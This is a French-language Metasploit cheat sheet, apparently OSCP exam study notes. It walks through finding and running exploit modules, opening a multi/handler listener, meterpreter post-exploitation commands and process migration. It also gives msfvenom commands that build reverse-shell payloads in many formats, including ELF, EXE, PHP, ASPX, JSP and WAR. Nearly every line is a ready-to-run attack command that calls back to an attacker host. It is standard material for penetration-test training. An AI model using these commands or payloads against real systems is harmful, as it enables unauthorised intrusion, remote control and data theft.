<img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/dd2b83bc-ab96-45e4-83c9-b7c38e9dcf98" height="180">

**Lancer nmap dans metasploit:**  
msf5 > db_nmap -A [IP]  
Il est possible faire des traitement sur les résultats du nmap.  
Par exemple la commande service donne tout les services détectés par nmap:  
msf5 > service [IP]  

**Rechercher une vulnérabilité:**  
msf5 > search [service]  

**Utiliser un module:**  
msf5 > use [/nom/du/script]  

**Voir les infos du module:**  
msf5 exploit(nom/du/script) > show info  

**Modifier un paramètre (LHOST, LPORT …):**  
msf5 exploit(nom/du/script) > set [PARAMETRE] [VARIABLE]  

**Lancer le script:**  
msf5 exploit(nom/du/script) > run  

**Pour Ouvrir un port en écoute:**  
msf5 > use exploit/multi/handler  
msf5 exploit(multi/handler) > set lhost [IP]  
msf5 exploit(multi/handler) > set lport [PORT]  
msf5 exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp (liste des payload avec show payload)  
msf5 exploit(multi/handler) > run  

## Commande dans le meterpreter:  
**shell : **obtenir un shell  
**getuid :** Obtenir le nom de l'utilisateur qui execute le shell  
**sysinfo :** Obtenir des information sur le systeme et sur le meterpreter  
**upload :** upload un fichier via le metterpreter  
**download :** download un fichier via le metterpreter  
**lls /lcd :** lister et changer de repertoire en local quand un metterpreter est ouvert  
**backgroud :** mettre le metterpreter en backgroud  

## Migrer de processus:  
Si le metterpreter n'est pas stable il faut migrer de processus  
En utilisant un module POST : post/windows/manage/migrate  
ou alors avec la commande ps et migrate:  
meterpreter > ps  
meterpreter > migrate [PID]  

## Utilisation de modules de POST exploitation:  
post/multi/recon/local_exploit_suggester --> Liste les faille probable pour l'elevation de privilège sur windows  

## Générer des payloads avec msfvenom:  
**Linux:**  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > file.elf  

**Windows :**  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > file.exe  

**Pour Bash :**  
msfvenom -p cmd/unix/reverse_bash LHOST=[IP]LPORT=[PORT] -f raw > file.sh  

**Pour Python:**  
msfvenom -p cmd/unix/reverse_python LHOST=[IP] LPORT=[PORT] -f raw > file.py  

**Pour Perl :**  
msfvenom -p cmd/unix/reverse_perl LHOST=[IP] LPORT=[PORT] -f raw > file.pl  

**Générer un fichier .php :**  
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > file.php  

**Générer un fichier.asp :**  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > file.asp  

**Générer un fichier .jsp :**  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > file.jsp  

**Générer un fichier .aspx :**  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f aspx > file.aspx  

**Générer un fichier .war:**  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > file.war  

